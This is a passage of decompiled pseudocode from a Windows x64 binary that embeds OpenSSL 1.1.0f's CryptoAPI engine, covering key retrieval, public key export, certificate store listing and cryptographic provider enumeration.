      v19 = result;
      if ( !result )
        return result;
      v20 = sub_1400321D0(a1, a2, result);
      v21 = v20;
      if ( v20 )
      {
        v3 = sub_140032640(a1, v20);
        CertFreeCertificateContext(v21);
      }
      CertCloseStore(v19, 0);
    }
    else if ( v2 == 3 )
    {
      cchWideChar = MultiByteToWideChar(0, 0, (LPCCH)a2, -1, 0i64, 0);
      if ( cchWideChar )
      {
        v7 = 2i64 * cchWideChar;
        v8 = v7 + 15;
        if ( v7 + 15 <= v7 )
          v8 = 0xFFFFFFFFFFFFFF0i64;
        v9 = v8 & 0xFFFFFFFFFFFFFFF0ui64;
        v10 = alloca(v9);
        v11 = alloca(v9);
        if ( MultiByteToWideChar(0, 0, (LPCCH)a2, -1, WideCharStr, cchWideChar) )
        {
          v12 = MultiByteToWideChar(0, 0, *(LPCCH *)(a1 + 24), -1, 0i64, 0);
          if ( v12 )
          {
            v13 = 2i64 * v12;
            v14 = v13 + 15;
            if ( v13 + 15 <= v13 )
              v14 = 0xFFFFFFFFFFFFFF0i64;
            v15 = v14 & 0xFFFFFFFFFFFFFFF0ui64;
            v16 = alloca(v15);
            v17 = alloca(v15);
            if ( MultiByteToWideChar(0, 0, *(LPCCH *)(a1 + 24), -1, WideCharStr, v12) )
              return sub_1400326B0(a1, WideCharStr, WideCharStr, *(_DWORD *)(a1 + 32), *(_DWORD *)(a1 + 16));
          }
        }
      }
    }
  }
  return v3;
}

//----- (0000000140032590) ----------------------------------------------------
__int64 __fastcall sub_140032590(__int64 a1)
{
  void **v2; // rax

  v2 = (void **)sub_140034A50(a1, dword_140135180);
  sub_1400317E0(v2);
  sub_140034B70(a1, dword_140135180, 0i64);
  return 1i64;
}
// 140135180: using guessed type int dword_140135180;

//----- (00000001400325E0) ----------------------------------------------------
void __fastcall sub_1400325E0(__int64 a1)
{
  if ( a1 )
  {
    CryptDestroyKey(*(_QWORD *)(a1 + 16));
    CryptReleaseContext(*(_QWORD *)(a1 + 8), 0);
    if ( *(_QWORD *)a1 )
      CertFreeCertificateContext(*(PCCERT_CONTEXT *)a1);
    sub_14001D930((void *)a1);
  }
}

//----- (0000000140032640) ----------------------------------------------------
HCRYPTPROV *__fastcall sub_140032640(__int64 a1, const CERT_CONTEXT *a2)
{
  HCRYPTPROV *v3; // rdi
  const WCHAR **v4; // rax
  const WCHAR **v5; // rbx

  v3 = 0i64;
  v4 = (const WCHAR **)sub_140032E00(a1, a2);
  v5 = v4;
  if ( v4 )
    v3 = sub_1400326B0(a1, *v4, v4[1], *((_DWORD *)v4 + 4), *((_DWORD *)v4 + 10));
  sub_14001D930(v5);
  return v3;
}

//----- (00000001400326B0) ----------------------------------------------------
HCRYPTPROV *__fastcall sub_1400326B0(__int64 a1, const WCHAR *a2, const WCHAR *a3, DWORD a4, DWORD dwKeySpec)
{
  int v5; // eax
  HCRYPTPROV *result; // rax
  HCRYPTPROV *v11; // rsi
  const WCHAR *v12; // rax
  int v13; // ecx
  int v14; // edx
  CHAR *v15; // rdi
  CHAR *v16; // rbx
  int v17; // eax
  int v18; // eax

  result = (HCRYPTPROV *)sub_14001D8E0((unsigned int)(v5 - 16));
  v11 = result;
  if ( result )
  {
    if ( a4 == 1 && dword_140142C20 )
    {
      v12 = a3;
      do
      {
        v13 = *(const WCHAR *)((char *)v12 + (char *)L"Microsoft Enhanced Cryptographic Provider v1.0" - (char *)a3);
        v14 = *v12 - v13;
        if ( v14 )
          break;
        ++v12;
      }
      while ( v13 );
      if ( !v14 )
      {
        a3 = L"Microsoft Enhanced RSA and AES Cryptographic Provider";
        a4 = 24;
      }
    }
    if ( a1 && *(int *)a1 >= 2 && *(_QWORD *)(a1 + 8) )
    {
      v15 = sub_140034820(a2);
      v16 = sub_140034820(a3);
      sub_140031000(a1, "capi_get_key, contname=%s, provname=%s, type=%d\n", v15, v16, a4);
      sub_14001D930(v16);
      sub_14001D930(v15);
    }
    if ( !CryptAcquireContextW(v11 + 1, a2, a3, a4, (*(_DWORD *)(a1 + 56) >> 12) & 0x20) )
    {
      v17 = dword_140142C24;
      if ( !dword_140142C24 )
      {
        v17 = sub_140024020();
        dword_140142C24 = v17;
      }
      sub_140024610(v17, 103, 103, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 1494);
      sub_140031280();
LABEL_21:
      sub_14001D930(v11);
      return 0i64;
    }
    if ( !CryptGetUserKey(v11[1], dwKeySpec, v11 + 2) )
    {
      v18 = dword_140142C24;
      if ( !dword_140142C24 )
      {
        v18 = sub_140024020();
        dword_140142C24 = v18;
      }
      sub_140024610(v18, 103, 113, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 1499);
      sub_140031280();
      CryptReleaseContext(v11[1], 0);
      goto LABEL_21;
    }
    *((_DWORD *)v11 + 6) = dwKeySpec;
    result = v11;
    *v11 = 0i64;
  }
  return result;
}
// 1400326E3: variable 'v5' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1400F41E0: using guessed type wchar_t aMicrosoftEnhan[47];
// 140142C20: using guessed type int dword_140142C20;
// 140142C24: using guessed type int dword_140142C24;

//----- (00000001400328C0) ----------------------------------------------------
_DWORD *__fastcall sub_1400328C0(__int64 a1, __int64 a2)
{
  __int64 v4; // r14
  _DWORD *v5; // rdi
  _QWORD *v6; // r15
  int v7; // eax
  unsigned int *pbData; // rbx
  int v10; // eax
  int v11; // eax
  __int64 v12; // r9
  __int64 v13; // r9
  int v14; // eax
  unsigned int v15; // ebp
  _DWORD *v16; // r12
  _DWORD *v17; // r13
  _DWORD *v18; // rax
  char *v19; // rsi
  char *v20; // rsi
  _DWORD *v21; // rax
  _DWORD *v22; // rcx
  int v23; // eax
  __int64 v24; // r9
  int v25; // eax
  _DWORD *v26; // rbp
  _DWORD *v27; // rax
  __int64 v28; // rsi
  _DWORD *v29; // rax
  int v30; // eax
  DWORD pdwDataLen; // [rsp+30h] [rbp-68h] BYREF
  _DWORD *v32; // [rsp+38h] [rbp-60h]
  _DWORD *v33; // [rsp+40h] [rbp-58h]
  __int64 v34[2]; // [rsp+48h] [rbp-50h] BYREF

  v34[0] = a2;
  v4 = 0i64;
  v5 = 0i64;
  v6 = 0i64;
  if ( !CryptExportKey(*(_QWORD *)(a2 + 16), 0i64, 6u, 0, 0i64, &pdwDataLen) )
  {
    v7 = dword_140142C24;
    if ( !dword_140142C24 )
    {
      v7 = sub_140024020();
      dword_140142C24 = v7;
    }
    sub_140024610(v7, 115, 117, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 637);
    sub_140031280();
    return 0i64;
  }
  pbData = (unsigned int *)sub_14001D8E0(pdwDataLen);
  if ( !pbData )
    goto LABEL_49;
  if ( !CryptExportKey(*(_QWORD *)(a2 + 16), 0i64, 6u, 0, (BYTE *)pbData, &pdwDataLen) )
  {
    v10 = dword_140142C24;
    if ( !dword_140142C24 )
    {
      v10 = sub_140024020();
      dword_140142C24 = v10;
    }
    sub_140024610(v10, 115, 116, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 648);
    sub_140031280();
    goto LABEL_52;
  }
  if ( *(_BYTE *)pbData != 6 )
  {
    v11 = dword_140142C24;
    if ( !dword_140142C24 )
    {
      v11 = sub_140024020();
      dword_140142C24 = v11;
    }
    sub_140024610(v11, 115, 115, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 655);
    goto LABEL_52;
  }
  v12 = pbData[1];
  if ( (((_DWORD)v12 - 9216) & 0xFFFF7FFF) == 0 )
  {
    v24 = pbData[2];
    if ( (_DWORD)v24 != 826364754 )
    {
      sub_14002A5C0(v34, 0xAui64, "%lx", v24);
      v25 = dword_140142C24;
      if ( !dword_140142C24 )
      {
        v25 = sub_140024020();
        dword_140142C24 = v25;
      }
      sub_140024610(v25, 115, 123, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 668);
      goto LABEL_39;
    }
    v4 = sub_14002D070(a1);
    if ( v4 )
    {
      v26 = sub_140027200();
      v27 = sub_140027200();
      v28 = (__int64)v27;
      if ( !v26 || !v27 )
      {
        sub_140026FF0(v26);
        v22 = (_DWORD *)v28;
        goto LABEL_48;
      }
      sub_14002D250(v4, (__int64)v27, (__int64)v26, 0i64);
      if ( (unsigned int)sub_140027560((__int64)v26, pbData[4]) )
      {
        if ( sub_1400347B0(v28, (char *)pbData + 20, pbData[3] >> 3) )
        {
          sub_14002D2F0(v4, dword_140135184, a2);
          v29 = sub_14001D530();
          v5 = v29;
          if ( v29 )
          {
            sub_14001D1A0((__int64)v29, 6, v4);
            v4 = 0i64;
            goto LABEL_52;
          }
        }
      }
    }
LABEL_49:
    v30 = dword_140142C24;
    if ( !dword_140142C24 )
    {
      v30 = sub_140024020();
      dword_140142C24 = v30;
    }
    sub_140024610(v30, 115, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 778);
    goto LABEL_52;
  }
  if ( (_DWORD)v12 != 8704 )
  {
    sub_14002A5C0(v34, 0xAui64, "%ux", v12);
    v23 = dword_140142C24;
    if ( !dword_140142C24 )
    {
      v23 = sub_140024020();
      dword_140142C24 = v23;
    }
    sub_140024610(v23, 115, 121, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 761);
    sub_140023A40(2, "aiKeyAlg=0x", v34);
    goto LABEL_52;
  }
  v13 = pbData[2];
  if ( (_DWORD)v13 != 827544388 )
  {
    sub_14002A5C0(v34, 0xAui64, "%lx", v13);
    v14 = dword_140142C24;
    if ( !dword_140142C24 )
    {
      v14 = sub_140024020();
      dword_140142C24 = v14;
    }
    sub_140024610(v14, 115, 122, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 714);
LABEL_39:
    sub_140023A40(2, "magic=0x", v34);
    goto LABEL_52;
  }
  v15 = pbData[3] >> 3;
  v6 = (_QWORD *)sub_14002DA80(a1);
  if ( !v6 )
    goto LABEL_49;
  v33 = sub_140027200();
  v16 = sub_140027200();
  v17 = sub_140027200();
  v18 = sub_140027200();
  v32 = v18;
  if ( !v33 || !v16 || !v17 || !v18 )
  {
    sub_140026FF0(v33);
    sub_140026FF0(v16);
    sub_140026FF0(v17);
    v22 = v32;
LABEL_48:
    sub_140026FF0(v22);
    goto LABEL_49;
  }
  sub_14002DC80(v6, (__int64)v33, (__int64)v16, (__int64)v17);
  sub_14002D640((__int64)v6, (__int64)v32, 0i64);
  if ( !sub_1400347B0((__int64)v33, (char *)pbData + 16, v15) )
    goto LABEL_49;
  v19 = (char *)pbData + v15 + 16;
  if ( !sub_1400347B0((__int64)v16, v19, 20) )
    goto LABEL_49;
  v20 = v19 + 20;
  if ( !sub_1400347B0((__int64)v17, v20, v15) )
    goto LABEL_49;
  if ( !sub_1400347B0((__int64)v32, &v20[v15], v15) )
    goto LABEL_49;
  sub_14002DD20((__int64)v6, dword_140135188, v34[0]);
  v21 = sub_14001D530();
  v5 = v21;
  if ( !v21 )
    goto LABEL_49;
  sub_14001D1A0((__int64)v21, 116, (__int64)v6);
  v6 = 0i64;
LABEL_52:
  sub_14001D930(pbData);
  if ( !v5 )
  {
    sub_14002CEF0(v4);
    sub_14002D940((__int64)v6);
  }
  return v5;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140135184: using guessed type int dword_140135184;
// 140135188: using guessed type int dword_140135188;
// 140142C24: using guessed type int dword_140142C24;

//----- (0000000140032E00) ----------------------------------------------------
void *__fastcall sub_140032E00(__int64 a1, const CERT_CONTEXT *a2)
{
  int v2; // eax
  void *v5; // rax
  void *v6; // rbx
  int v7; // eax
  int v8; // eax
  DWORD pcbData; // [rsp+50h] [rbp+18h] BYREF

  if ( !CertGetCertificateContextProperty(a2, v2 - 46, 0i64, &pcbData) )
    return 0i64;
  v5 = sub_14001D8E0(pcbData);
  v6 = v5;
  if ( v5 )
  {
    if ( CertGetCertificateContextProperty(a2, 2u, v5, &pcbData) )
    {
      return v6;
    }
    else
    {
      v8 = dword_140142C24;
      if ( !dword_140142C24 )
      {
        v8 = sub_140024020();
        dword_140142C24 = v8;
      }
      sub_140024610(v8, 105, 109, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 1278);
      sub_140031280();
      sub_14001D930(v6);
      return 0i64;
    }
  }
  else
  {
    v7 = dword_140142C24;
    if ( !dword_140142C24 )
    {
      v7 = sub_140024020();
      dword_140142C24 = v7;
    }
    sub_140024610(v7, 105, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 1272);
    return 0i64;
  }
}
// 140032E1A: variable 'v2' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140142C24: using guessed type int dword_140142C24;

//----- (0000000140032F20) ----------------------------------------------------
__int64 __fastcall sub_140032F20(__int64 a1, const char **a2, DWORD *a3, DWORD a4)
{
  unsigned int LastError; // ebx
  int v10; // eax
  WCHAR *szProvName; // rbx
  int v12; // eax
  unsigned int v13; // edi
  int v14; // eax
  DWORD pcbProvName[6]; // [rsp+30h] [rbp-18h] BYREF

  sub_140031000(a1, "capi_get_provname, index=%d\n", a4);
  if ( !CryptEnumProvidersW(a4, 0i64, 0, a3, 0i64, pcbProvName) )
  {
    LastError = GetLastError();
    if ( LastError == 259 )
      return 2i64;
    v10 = dword_140142C24;
    if ( !dword_140142C24 )
    {
      v10 = sub_140024020();
      dword_140142C24 = v10;
    }
    sub_140024610(v10, 104, 104, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 1128);
    sub_140031220(LastError);
    return 0i64;
  }
  szProvName = (WCHAR *)sub_14001D8E0(pcbProvName[0]);
  if ( szProvName )
  {
    if ( CryptEnumProvidersW(a4, 0i64, 0, a3, szProvName, pcbProvName) )
    {
      *a2 = sub_140034820(szProvName);
      sub_14001D930(szProvName);
      if ( !*a2 )
        return 0i64;
      sub_140031000(a1, "capi_get_provname, returned name=%s, type=%d\n", *a2, *a3);
      return 1i64;
    }
    else
    {
      v13 = GetLastError();
      sub_14001D930(szProvName);
      if ( v13 == 259 )
        return 2i64;
      v14 = dword_140142C24;
      if ( !dword_140142C24 )
      {
        v14 = sub_140024020();
        dword_140142C24 = v14;
      }
      sub_140024610(v14, 104, 104, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 1142);
      sub_140031220(v13);
      return 0i64;
    }
  }
  else
  {
    v12 = dword_140142C24;
    if ( !dword_140142C24 )
    {
      v12 = sub_140024020();
      dword_140142C24 = v12;
    }
    sub_140024610(v12, 104, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 1134);
    return 0i64;
  }
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140142C24: using guessed type int dword_140142C24;

//----- (0000000140033120) ----------------------------------------------------
__int64 __fastcall sub_140033120(__int64 a1)
{
  int v1; // eax
  char **v3; // rbx
  struct _xDISPATCHER_CONTEXT *v4; // rax
  __int64 jumpbuf_sp; // rax
  __int64 v6; // rax
  __int64 v7; // rax
  char **v8; // rbx
  __int64 v9; // rax
  __int64 v10; // rax
  __int64 v11; // rax
  _DWORD *v12; // rax
  int v13; // eax
  HCRYPTPROV phProv; // [rsp+48h] [rbp+10h] BYREF

  if ( dword_140135180 < 0 )
  {
    dword_140135180 = sub_1400261E0(v1 - 38, 0, 0i64, 0i64, 0i64, 0i64);
    if ( dword_140135180 < 0 )
      goto LABEL_17;
    dword_14013518C = sub_1400261E0(3u, 0, 0i64, 0i64, 0i64, 0i64);
    dword_140135184 = sub_1400261E0(9u, 0, 0i64, 0i64, 0i64, 0i64);
    v3 = sub_14004F540();
    v4 = __FrameHandler3::TryBlockMap::getpDC((__FrameHandler3::TryBlockMap *)v3);
    if ( !(unsigned int)sub_14005E7D0(qword_140142C10, (__int64)v4) )
      goto LABEL_17;
    jumpbuf_sp = _except_get_jumpbuf_sp(v3);
    if ( !(unsigned int)sub_140025390(qword_140142C10, jumpbuf_sp) )
      goto LABEL_17;
    if ( !(unsigned int)sub_1400253C0(qword_140142C10, (__int64)sub_140034280) )
      goto LABEL_17;
    if ( !(unsigned int)sub_140025370(qword_140142C10, (__int64)sub_140034000) )
      goto LABEL_17;
    v6 = std::ios_base::width((std::ios_base *)v3);
    if ( !(unsigned int)sub_140046D90(qword_140142C10, v6) )
      goto LABEL_17;
    v7 = __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(v3);
    if ( !(unsigned int)sub_140040D40(qword_140142C10, v7) )
      goto LABEL_17;
    if ( !(unsigned int)sub_14005C310(qword_140142C10, (__int64)sub_140033F70) )
      goto LABEL_17;
    if ( !(unsigned int)sub_140034B60(qword_140142C10, (__int64)sub_1400342D0) )
      goto LABEL_17;
    dword_140135188 = sub_1400261E0(7u, 0, 0i64, 0i64, 0i64, 0i64);
    v8 = sub_140050730();
    if ( !(unsigned int)sub_14005E7D0(qword_140142C18, (__int64)sub_140031B70) )
      goto LABEL_17;
    v9 = sub_14001C740((__int64)v8);
    if ( !(unsigned int)sub_1400253C0(qword_140142C18, v9) )
      goto LABEL_17;
    if ( !(unsigned int)sub_1400257F0(qword_140142C18, (__int64)sub_140031ED0) )
      goto LABEL_17;
    v10 = std::ios_base::precision((std::ios_base *)v8);
    if ( !(unsigned int)sub_140025370(qword_140142C18, v10) )
      goto LABEL_17;
    v11 = std::ios_base::width((std::ios_base *)v8);
    if ( !(unsigned int)sub_140046D90(qword_140142C18, v11) )
      goto LABEL_17;
  }
  v12 = sub_140031880();
  if ( v12 )
  {
    sub_140034B70(a1, dword_140135180, (__int64)v12);
    if ( CryptAcquireContextW(
           &phProv,
           0i64,
           L"Microsoft Enhanced RSA and AES Cryptographic Provider",
           0x18u,
           0xF0000000) )
    {
      dword_140142C20 = 1;
      CryptReleaseContext(phProv, 0);
    }
    return 1i64;
  }
  else
  {
LABEL_17:
    v13 = dword_140142C24;
    if ( !dword_140142C24 )
    {
      v13 = sub_140024020();
      dword_140142C24 = v13;
    }
    sub_140024610(v13, 106, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 489);
    return 0i64;
  }
}
// 14003314A: variable 'v1' is possibly undefined
// 1400206D0: using guessed type __int64 __fastcall _except_get_jumpbuf_sp(_QWORD);
// 1400219F0: using guessed type __int64 __fastcall __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(_QWORD);
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140135180: using guessed type int dword_140135180;
// 140135184: using guessed type int dword_140135184;
// 140135188: using guessed type int dword_140135188;
// 14013518C: using guessed type int dword_14013518C;
// 140142C10: using guessed type __int64 qword_140142C10;
// 140142C18: using guessed type __int64 qword_140142C18;
// 140142C20: using guessed type int dword_140142C20;
// 140142C24: using guessed type int dword_140142C24;

//----- (0000000140033400) ----------------------------------------------------
HCERTSTORE __fastcall sub_140033400(__int64 a1, __int64 a2, const void *a3)
{
  int v3; // eax
  unsigned int v4; // r15d
  const char *v6; // rbx
  HCERTSTORE result; // rax
  void *v10; // rsi
  const CERT_CONTEXT *v11; // rax
  const CERT_CONTEXT *v12; // rbx
  unsigned int v13; // ebx
  const CERT_CONTEXT *i; // rdi

  v4 = v3 - 31;
  v6 = "MY";
  if ( *(_QWORD *)(a1 + 40) )
    v6 = *(const char **)(a1 + 40);
  sub_140031000(a1, "Listing certs for store %s\n", v6);
  result = sub_140033EC0(a1, v6);
  v10 = result;
  if ( result )
  {
    if ( a3 )
    {
      v11 = sub_1400321D0(a1, a3, result);
      v12 = v11;
      if ( v11 )
      {
        sub_140031F60(a1, a2, v11);
        CertFreeCertificateContext(v12);
      }
      else
      {
        v4 = 0;
      }
    }
    else
    {
      v13 = 0;
      for ( i = CertEnumCertificatesInStore(result, 0i64); i; i = CertEnumCertificatesInStore(v10, i) )
      {
        sub_14002A590(a2, "Certificate %d\n", v13);
        sub_140031F60(a1, a2, i);
        ++v13;
      }
    }
    CertCloseStore(v10, 0);
    return (HCERTSTORE)v4;
  }
  return result;
}
// 140033421: variable 'v3' is possibly undefined

//----- (0000000140033520) ----------------------------------------------------
__int64 __fastcall sub_140033520(__int64 a1, __int64 a2)
{
  __int64 v2; // r9
  const char *v4; // r8
  unsigned int v6; // r15d
  WCHAR *v7; // rbx
  const CHAR *v8; // r8
  unsigned int v9; // edx
  unsigned __int64 v10; // rax
  __int64 v11; // rcx
  signed __int64 v12; // rcx
  void *v13; // rsp
  void *v14; // rsp
  int v15; // eax
  int v17; // eax
  int v18; // eax
  unsigned int v19; // eax
  BYTE *v20; // rdi
  int v21; // eax
  unsigned int i; // ebx
  unsigned int LastError; // ebx
  int v24; // eax
  LPWSTR lpWideCharStr; // [rsp+20h] [rbp-10h]
  __int64 cchWideChar; // [rsp+28h] [rbp-8h]
  WCHAR WideCharStr[2]; // [rsp+30h] [rbp+0h] BYREF
  DWORD pdwDataLen; // [rsp+34h] [rbp+4h] BYREF
  HCRYPTPROV phProv; // [rsp+38h] [rbp+8h] BYREF

  v2 = *(unsigned int *)(a1 + 32);
  v4 = *(const char **)(a1 + 24);
  *(_DWORD *)WideCharStr = 0;
  v6 = 1;
  v7 = 0i64;
  sub_140031000(a1, "Listing containers CSP=%s, type = %d\n", v4, v2);
  v8 = *(const CHAR **)(a1 + 24);
  if ( v8 )
  {
    v9 = MultiByteToWideChar(0, 0, v8, -1, 0i64, 0);
    pdwDataLen = v9;
    if ( !v9 )
      goto LABEL_6;
    v10 = 2i64 * v9;
    v11 = v10 + 15;
    if ( v10 + 15 <= v10 )
      v11 = 0xFFFFFFFFFFFFFF0i64;
    v12 = v11 & 0xFFFFFFFFFFFFFFF0ui64;
    v13 = alloca(v12);
    v14 = alloca(v12);
    v7 = WideCharStr;
    MultiByteToWideChar(0, 0, *(LPCCH *)(a1 + 24), -1, WideCharStr, v9);
    if ( !WideCharStr )
    {
LABEL_6:
      v15 = dword_140142C24;
      if ( !dword_140142C24 )
      {
        v15 = sub_140024020();
        dword_140142C24 = v15;
      }
      sub_140024610(v15, 107, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 1197);
      sub_140031280();
      return 0i64;
    }
  }
  if ( !CryptAcquireContextW(&phProv, 0i64, v7, *(_DWORD *)(a1 + 32), 0xF0000000) )
  {
    v17 = dword_140142C24;
    if ( !dword_140142C24 )
    {
      v17 = sub_140024020();
      dword_140142C24 = v17;
    }
    sub_140024610(v17, 107, 103, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 1205);
    sub_140031280();
    return 0i64;
  }
  if ( CryptGetProvParam(phProv, 2u, 0i64, (DWORD *)WideCharStr, 1u) )
  {
    sub_140031000(a1, "Got max container len %d\n", *(unsigned int *)WideCharStr);
    v19 = *(_DWORD *)WideCharStr;
    if ( !*(_DWORD *)WideCharStr )
      v19 = 1024;
    *(_DWORD *)WideCharStr = v19;
    v20 = (BYTE *)sub_14001D8E0(v19);
    if ( v20 )
    {
      for ( i = 0; ; ++i )
      {
        pdwDataLen = *(_DWORD *)WideCharStr;
        *v20 = 0;
        if ( !CryptGetProvParam(phProv, 2u, v20, &pdwDataLen, i == 0) )
          break;
        LODWORD(cchWideChar) = i == 0;
        LODWORD(lpWideCharStr) = i;
        sub_140031000(
          a1,
          "Container name %s, len=%d, index=%d, flags=%d\n",
          (const char *)v20,
          pdwDataLen,
          lpWideCharStr,
          cchWideChar);
        if ( !*v20 && pdwDataLen == *(_DWORD *)WideCharStr )
        {
          sub_140031000(a1, "Enumerate bug: using workaround\n");
          goto LABEL_34;
        }
        sub_14002A590(a2, "%lu. %s\n", i, (const char *)v20);
      }
      LastError = GetLastError();
      if ( LastError == 259 )
        goto LABEL_34;
      v24 = dword_140142C24;
      if ( !dword_140142C24 )
      {
        v24 = sub_140024020();
        dword_140142C24 = v24;
      }
      sub_140024610(v24, 107, 107, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 1238);
      sub_140031220(LastError);
    }
    else
    {
      v21 = dword_140142C24;
      if ( !dword_140142C24 )
      {
        v21 = sub_140024020();
        dword_140142C24 = v21;
      }
      sub_140024610(v21, 107, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 1221);
    }
    v6 = 0;
LABEL_34:
    sub_14001D930(v20);
    CryptReleaseContext(phProv, 0);
    return v6;
  }
  v18 = dword_140142C24;
  if ( !dword_140142C24 )
  {
    v18 = sub_140024020();
    dword_140142C24 = v18;
  }
  sub_140024610(v18, 107, 107, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 1211);
  sub_140031280();
  CryptReleaseContext(phProv, 0);
  return 0i64;
}
// 1400337CB: variable 'lpWideCharStr' is possibly undefined
// 1400337CB: variable 'cchWideChar' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140142C24: using guessed type int dword_140142C24;

//----- (00000001400338A0) ----------------------------------------------------
__int64 __fastcall sub_1400338A0(__int64 a1, __int64 a2)
{
  DWORD i; // edi
  void *v5; // rbx
  CHAR *v6; // rsi
  unsigned int LastError; // edi
  int v8; // eax
  int v9; // eax
  DWORD v10; // ebx
  int v11; // eax
  LPWSTR szProvName; // [rsp+20h] [rbp-58h]
  DWORD pdwProvType; // [rsp+30h] [rbp-48h] BYREF
  DWORD pcbProvName; // [rsp+34h] [rbp-44h] BYREF
  char v16[16]; // [rsp+38h] [rbp-40h] BYREF

  sub_140031000(a1, "capi_list_providers\n");
  sub_14002A590(a2, "Available CSPs:\n");
  for ( i = 0; ; ++i )
  {
    sub_140031000(a1, "capi_get_provname, index=%d\n", i);
    if ( !CryptEnumProvidersW(i, 0i64, 0, &pdwProvType, 0i64, &pcbProvName) )
      break;
    v5 = sub_14001D8E0(pcbProvName);
    if ( !v5 )
    {
      v9 = dword_140142C24;
      if ( !dword_140142C24 )
      {
        v9 = sub_140024020();
        dword_140142C24 = v9;
      }
      sub_140024610(v9, 104, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 1134);
      return 1i64;
    }
    if ( !CryptEnumProvidersW(i, 0i64, 0, &pdwProvType, (LPWSTR)v5, &pcbProvName) )
    {
      LastError = GetLastError();
      sub_14001D930(v5);
      if ( LastError != 259 )
      {
        v8 = dword_140142C24;
        if ( !dword_140142C24 )
        {
          v8 = sub_140024020();
          dword_140142C24 = v8;
        }
        sub_140024610(v8, 104, 104, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 1142);
        sub_140031220(LastError);
      }
      return 1i64;
    }
    v6 = sub_140034820((const WCHAR *)v5);
    sub_14001D930(v5);
    if ( !v6 )
      return 1i64;
    sub_140031000(a1, "capi_get_provname, returned name=%s, type=%d\n", v6, pdwProvType);
    LODWORD(szProvName) = pdwProvType;
    sub_14002A590(a2, "%lu. %s, type %lu\n", i, v6, szProvName);
    sub_14001D930(v6);
  }
  v10 = GetLastError();
  if ( v10 != 259 )
  {
    v11 = dword_140142C24;
    if ( !dword_140142C24 )
    {
      v11 = sub_140024020();
      dword_140142C24 = v11;
    }
    sub_140024610(v11, 104, 104, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 1128);
    sub_14002A5C0(v16, 0xAui64, "%lX", v10);
    sub_140023A40(2, "Error code= 0x", v16);
  }
  return 1i64;
}
// 1400339DA: variable 'szProvName' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140142C24: using guessed type int dword_140142C24;

//----- (0000000140033B40) ----------------------------------------------------
_DWORD *__fastcall sub_140033B40(__int64 a1, const void *a2)
{
  __int64 v4; // rax
  int v5; // eax
  HCRYPTPROV *v7; // rax
  __int64 v8; // rbx
  _DWORD *v9; // rdi

  v4 = sub_140034A50(a1, dword_140135180);
  if ( !v4 )
  {
    v5 = dword_140142C24;
    if ( !dword_140142C24 )
    {
      v5 = sub_140024020();
      dword_140142C24 = v5;
    }
    sub_140024610(v5, 108, 100, (unsigned int)"..\\..\\openssl-1.1.0f\\engines\\e_capi.c", 792);
    return 0i64;
  }
  v7 = sub_1400323D0(v4, a2);
  v8 = (__int64)v7;
  if ( !v7 )
    return 0i64;
  v9 = sub_1400328C0(a1, (__int64)v7);
  if ( !v9 )
    sub_1400325E0(v8);
  return v9;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140135180: using guessed type int dword_140135180;
// 140142C24: using guessed type int dword_140142C24;

//----- (0000000140033BF0) ----------------------------------------------------
__int64 __fastcall sub_140033BF0(__int64 a1, __int64 a2, unsigned int *a3, __int64 *a4, _QWORD *a5)
{
  int v5; // esi
  int *v6; // rbp
  __int64 *v7; // rbx
  unsigned int *v8; // r14
  __int64 v9; // r13
  const char *v10; // rdx
  __int64 result; // rax
  void *v12; // r12
  unsigned int v13; // r15d
  PCCERT_CONTEXT v14; // rdi
  __int64 v15; // rax
  unsigned int *v16; // rbx
  HCRYPTPROV *v17; // r14
  PCCERT_CONTEXT v18; // rax
  int v19; // edx
  int v20; // r14d
  __int64 v21; // rax
  unsigned int *v22; // rdi
  __int64 v23; // rax
  __int64 v24; // rbx
  __int64 v25; // rax
  _DWORD *v26; // rax
  int v27; // edx
